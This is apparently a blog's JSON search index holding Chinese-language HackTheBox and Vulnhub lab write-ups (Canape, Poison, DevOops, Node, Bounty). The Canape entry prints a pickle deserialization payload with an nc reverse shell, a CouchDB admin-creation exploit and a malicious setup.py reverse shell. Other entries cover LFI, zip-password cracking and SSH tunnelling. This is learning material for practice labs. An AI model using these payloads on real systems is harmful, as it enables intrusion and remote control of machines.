alt=\"image\"\u003e\naspx的站，去看看\u003c/p\u003e\n\u003ch3 id=\"0x02-web-exploit\"\u003e0x02 Web Exploit\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://naivekun.com/images/1540817003087.png\" alt=\"image\"\u003e\n有个上传点\n怼点东西上去\u003c/p\u003e","tags":["HackTheBox"],"title":"[HackTheBox]Bounty - WriteUp","uri":"https://naivekun.com/2018/10/htb-bounty/","year":"2018"},{"content":"Discover 开了个ssh和http Gunicorn是什么鬼。。。 从http入手\nWeb Exploit 啥也没有，只有几行字和一张图片\n扫目录吧 发现/upload 嗯。XML.。 考虑XML注入，文件包含 随便传个文本 Burp看一下 要XML?自己写一个吧 回显是这个 尝试文件包含 得到/etc/passwd 有了LFI，考虑读网站源码 再看一下主页 读feed.py 注意： 又是Pickle 反序列化直接弹shell 先构造Pickle对象 把返回的字符串POST到/newpost即可\n得到shell 可以拿到user.txt了\nPrivilege Escalation 看一下uname Linux gitter 4.13.0-37-generic #42~16.04.1-Ubuntu 好像找不到提权漏洞。。。 没有sudo -l 没有crontab 没有setuid 发现在~/.ssh/id_rsa 有这个低权限用户的ssh密钥 没啥用。。。 我要root的。。。\n看看git信息吧 在~/work/blogfeed/下有个.git git log看看 accidental commit？？？ 看看 删了个key，又加了个key 把那个删的弄下来 ssh -i看看 666 这就完了。。。\n","id":45,"section":"posts","summary":"\u003ch3 id=\"discover\"\u003eDiscover\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://naivekun.com/images/1539828067751.png\" alt=\"image\"\u003e\n开了个ssh和http\nGunicorn是什么鬼。。。\n从http入手\u003c/p\u003e","tags":["HackTheBox"],"title":"[HackTheBox]DevOops - WriteUp","uri":"https://naivekun.com/2018/10/htb-devoops-writeup/","year":"2018"},{"content":"0x01 Discovery 有个Node.js的web 有个ssh\n0x02 Web Exploit 有个登陆框，有个查看用户信息的东西\n登陆框注入无果。 看看源码 发现这两个东西 暴露了两个api：/api/users/和/api/users/latest 访问一下看看 md5解密，登陆，发现没啥东西。。。 再看看另一个 得到root的账号和密码 登进后台 嗯，下下来看看 是个纯文本？打开看看。。。额，把虚拟机卡死了 看起来像base64，解码看看 base64 -d myplace.backup \u0026gt; a.lalala 是个压缩包，打开看看，是网站源码，要密码 拿rockyou爆破试试fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip 得到密码：magicword\n开始看源码 因为是Node.js写的，先看app.js 看到数据库的配置 拿这个账号mark和密码连接ssh，得到低权限shell 0x03 Privilege Escalation sudo -l没东西 进程里也没啥 计划任务也没啥 看一下内核 4.4.0直接提权就行 scp传上源码，gcc编译运行，得到root shell 翻翻/root和/home即可得到flag\n0x04 总结 这个盒子不难，但是东西很杂。 可以用来练手速。。。\n","id":46,"section":"posts","summary":"\u003ch3 id=\"0x01-discovery\"\u003e0x01 Discovery\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://naivekun.com/images/1538912379234.png\" alt=\"image\"\u003e\n有个Node.js的web\n有个ssh\u003c/p\u003e","tags":["vulnhub"],"title":"[Vulnhub] Node:1 - Writeup","uri":"https://naivekun.com/2018/10/untitled-1538912211656/","year":"2018"},{"content":"0x01 Discovery 就开了个80 http，懒得放图。\n0x02 Web Exploit 进去看看 两个功能，发言和查看发言 对发言功能抓包看看 考虑注入，丢进sqlmap看看。。。发现没卵用\n换个方向，扫目录。 dirb http://10.10.10.70 咋都是200? 进一步尝试发现http://10.10.10.70/后面加什么都会返回主页 有时还会返回随机垃圾内容 考虑使用工具wfuzz Google学习一下怎么用 wfuzz -u http://10.10.10.70/FUZZ -w /usr/share/wordlists/dirb/small.txt 发现字符长度是3076的应该是主页，在接下来的测试中忽略3076。另外，只有一个单词的应该是垃圾字符串，忽略 wfuzz -u http://10.10.10.70/FUZZ --hw 1 --hh 3076 -w /usr/share/wordlists/dirb/small.txt 发现/submit,/static，看看。。。没啥用 换个字典，发现.git源码泄露！！！ 尝试git clone 此处有坑点，查看http://10.10.10.70/.git/config 改一下hosts，把10.10.10.70变成git.canape.htb即可 git clone http://git.canape.htb/simpsons.git 目录结构如下（这个平台不会没事藏flag）\n.\r├── __init__.py\r├── static\r│ ├── css\r│ │ ├── bootstrap.min.css\r│ │ ├── bootstrap.min.css.map\r│ │ └── custom.css\r│ └── js\r│ ├── bootstrap.min.js\r│ └── bootstrap.min.js.map\r└── templates\r├── index.html\r├── layout.html\r├── quotes.html\r└── submit.html\r 重点放在__init__.py上 用来污染404的功能，随机返回垃圾序列或者回到index.html 这两个没啥 重点看submit函数 可以看到通过POST传入char和quote两个参数 第55行，char必须包含whitelist中的关键字 第59-62行，把char和quote拼接后得到md5，并将拼接后的字符串写到/tmp/{md5}.p中 这看起来没什么用。。。 最后有个check函数 可以看到POST获取id值，并读取/tmp/{id}.p ** 75行!! Pickle !! ** 在python中 pickle用于序列化和反序列化一个对象 这里直接将{id}.p的内容反序列化，存在很多问题。 Google一下python反序列化漏洞，发现了这个神奇的函数__reduce__\nclass A(object):\rdef __reduce__(self):\rdo_something()\r __reduce__返回值必须是一个元组，其中第一个是可调用的对象，第二个是可调用对象的参数对象 当对这个类型反序列化时，执行这个返回值的可调用的对象！ 我们这样构造类\nclass PIG(object):\rdef __reduce__(self):\rreturn (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.192 1233 \u0026gt;/tmp/f',))\r  此处有个坑，python2中类括号必须写object\n 这样在反序列化时就执行了\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.192 1233 \u0026gt;/tmp/f\r 再看一下流程\nst=\u0026gt;start: POST /submit得到char和quote变量\rf1=\u0026gt;condition: 判断char中有没有whitelist中的字符\rerr=\u0026gt;subroutine: 报错\rf2=\u0026gt;operation: 拼接char和quote，将拼接后的数据写入/tmp/{id}.p中，id的计算方法见上文\rf3=\u0026gt;operation: POST /check得到id值，读取/tmp/{id}.p内容，并对内容进行反序列化\re=\u0026gt;end: 结束\rst-\u0026gt;f1\rf1(yes)-\u0026gt;f2-\u0026gt;f3-\u0026gt;e\rf1(no)-\u0026gt;err\r 我们在本地将PIG类序列化，分成两段POST到/submit上就行 需要绕过whitelist，这个简单，加个echo (whitelist关键字)即可\necho homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.192 1233 \u0026gt;/tmp/f\r 在本地生成序列化数据\nimport os\rimport cPickle\rfrom hashlib import md5\rclass PIG(object):\rdef __reduce__(self):\rreturn (os.system,('echo homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.192 1233 \u0026gt;/tmp/f',))\rpig=cPickle.dumps(PIG())\rprint pig\rprint \u0026quot;********************\u0026quot;\rid_p=md5(char + quote).hexdigest()\rprint id_p\rprint \u0026quot;********************\u0026quot;\r 得到\ncposix\rsystem\rp1\r(S'echo Homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.192 1233 \u0026gt;/tmp/f'\rp2\rtp3\rRp4\r.\r********************\rf7beb0ed6d2ea7a49f0e3f0fbb743ae5\r********************\r 手工切成两部分\ncharacter=cposix\rsystem\rp1\r(S'echo homer;\u0026amp;quote=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.192 1233 \u0026gt;/tmp/f'\rp2\rtp3\rRp4\r.\r 丢进burp里即可 之后nc -lvnp 1233，再POST /check，参数写id=f7beb0ed6d2ea7a49f0e3f0fbb743ae5 得到shell 0x03 Privilege Escalation I www-data没什么权限。。。 之前审源码时发现有个couchDB数据库，监听在本地5984端口上 Google学习一下 这个东西可以通过http访问 curl -X GET http://127.0.0.1:5984/ 获取数据库curl -X GET http://127.0.0.1:5984/_all_dbs passwords!!眼前一亮 额。。。mdzz Google一下，发现 Apache CouchDB 1.7.0 and 2.x before 2.1.1 - Remote Privilege Escalation 这个看起来不错，核心内容就这两句\ncu_url_payload = url + \u0026quot;/_users/org.couchdb.user:\u0026quot; + user\rcu_data_payload = '{\u0026quot;type\u0026quot;: \u0026quot;user\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;'+user+'\u0026quot;, \u0026quot;roles\u0026quot;: [\u0026quot;_admin\u0026quot;], \u0026quot;roles\u0026quot;: [], \u0026quot;password\u0026quot;: \u0026quot;'+password+'\u0026quot;}'\r 那么直接在shell上curl -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:naivekun --data-binary '{\u0026quot;type\u0026quot;: \u0026quot;user\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;naivekun\u0026quot;, \u0026quot;roles\u0026quot;: [\u0026quot;_admin\u0026quot;], \u0026quot;roles\u0026quot;: [], \u0026quot;password\u0026quot;: \u0026quot;toosimple\u0026quot;}' 得到{\u0026quot;ok\u0026quot;:true,\u0026quot;id\u0026quot;:\u0026quot;org.couchdb.user:naivekun\u0026quot;,\u0026quot;rev\u0026quot;:\u0026quot;1-30aeb89aab73ae979c754bce5f397599\u0026quot;} 之后通过http访问passwords curl -X GET http://127.0.0.1:5984/passwords -u naivekun:toosimple curl -X GET http://127.0.0.1:5984/_all_docs -u naivekun:toosimple 发现了这些东西 看一下用户 homer❌1000:1000:homer,,,:/home/homer:/bin/bash 那么su homer -，用上面的密码试试即可\n$ su homer -\rsu: must be run from a terminal\r 什么鬼？python -c \u0026quot;import pty;pty.spawn('/bin/bash')\u0026quot; 得到一个真终端，然后切换成homer用户即可得到user.txt 0x03 Privilege Escalation II 接下来搞root权限 crontab好像没啥东西 sudo -l看看 造一个python模块用pip安装即可\necho 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\rs.connect((\u0026quot;10.10.16.192\u0026quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\ros.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);' \u0026gt; setup.py\r 之后sudo pip install .即可反弹shell 0x04 总结  wfuzz的使用 Google大法 提权新姿势 ","id":47,"section":"posts","summary":"\u003ch3 id=\"0x01-discovery\"\u003e0x01 Discovery\u003c/h3\u003e\n\u003cp\u003e就开了个\u003ccode\u003e80 http\u003c/code\u003e，懒得放图。\u003c/p\u003e\n\u003ch3 id=\"0x02-web-exploit\"\u003e0x02 Web Exploit\u003c/h3\u003e\n\u003cp\u003e进去看看\n\u003cimg src=\"https://naivekun.com/images/1537594046552.png\" alt=\"\"\u003e\u003c/p\u003e","tags":["HackTheBox"],"title":"[HackTheBox]Canape - Writeup","uri":"https://naivekun.com/2018/09/hackthebox-canape-writeup/","year":"2018"},{"content":"知识点\n PHP LFI ssh隧道\n 0x01 Discovery nmap开路 0x02 Web Exploit 先从80端口入手 看一下网页 随便试几个，listfiles看起来不错 发现：pwdbackup.txt 链接改成http://10.10.10.84/browse.php?file=pwdbackup.txt 得到\nThis password is secure, it's encoded atleast 13 times.. what could go wrong really..\rVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU\rbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS\rbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW\rM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs\rWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy\reG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G\rWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw\rMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa\rT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k\rWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk\rWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0\rNFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT\rVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz\rWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW\rVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO\rUkd4RVdub3dPVU5uUFQwSwo=\r 进行13次base64解码 得到密码Charix!2#4%6\u0026amp;8(0 接着构造链接http://10.10.10.84/browse.php?file=../../../../../etc/passwd 读取到passwd文件，发现用户charix ssh直接登录，拿到user.txt 0x03 Privilege Escalation 想办法提升权限。uname -a看一下\nFreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64\r 这个版本google一下，没什么可利用的 看一下进程，root下有个vnc 看一下网络，vnc监听在本地端口 ssh? 考虑使用ssh隧道 ssh -L 5555:127.0.0.1:5901 charix@10.10.10.84 将本地5555端口转发到远端127.0.0.1的5901上 然后连接本地127.0.0.1:5555 结果。。。 试着找找线索 在charix用户目录发现secret.zip 使用scp下载下来scp charix@10.10.10.84:secret.zip . 解压缩，需要密码，试一试发现和ssh密码一样，得到secret文件 ？？？这个secret是乱码啊 Google一下，这是vnc的密码文件，有两种方法：\n 直接vncviewer -passwd secret 127.0.0.1:5555 使用一个工具vncpwd 解出密码为VNCP@$$!   任选其一，登上vnc即可得到shell，用户为root\n0x04 题外话 TMD感受一下丢包率和延迟 0x05 总结  ssh不仅仅是个远程终端，还可以做隧道或者传文件 提权过程注意观察进程和端口 ","id":48,"section":"posts","summary":"\u003cp\u003e知识点\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ePHP LFI\nssh隧道\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 id=\"0x01-discovery\"\u003e0x01 Discovery\u003c/h3\u003e\n\u003cp\u003enmap开路\n\u003cimg src=\"https://naivekun.com/images/1537539443912.png\" alt=\"\"\u003e\u003c/p\u003e","tags":["HackTheBox"],"title":"[HackTheBox]Poison - Writeup","uri":"https://naivekun.com/2018/09/hackthebox-poison-writeup/","year":"2018"},{"content":"题库 实验吧 Pentest-it\nWeChall Hack The Box Root-Me HackThis CTF Time\n","id":49,"section":"posts","summary":"题库 实验吧 Pentest-it WeChall Hack The Box Root-Me HackThis CTF Time","tags":[],"title":"信息安全入坑笔记","uri":"https://naivekun.com/2018/08/ns-note/","year":"2018"},{"content":"毕业了。\n","id":50,"section":"posts","summary":"毕业了。","tags":[],"title":"新的开始","uri":"https://naivekun.com/2018/08/new/","year":"2018"}],"tags":[{"title":"ctf","uri":"https://naivekun.com/tags/ctf/"},{"title":"HackTheBox","uri":"https://naivekun.com/tags/hackthebox/"},{"title":"vulnhub","uri":"https://naivekun.com/tags/vulnhub/"}]}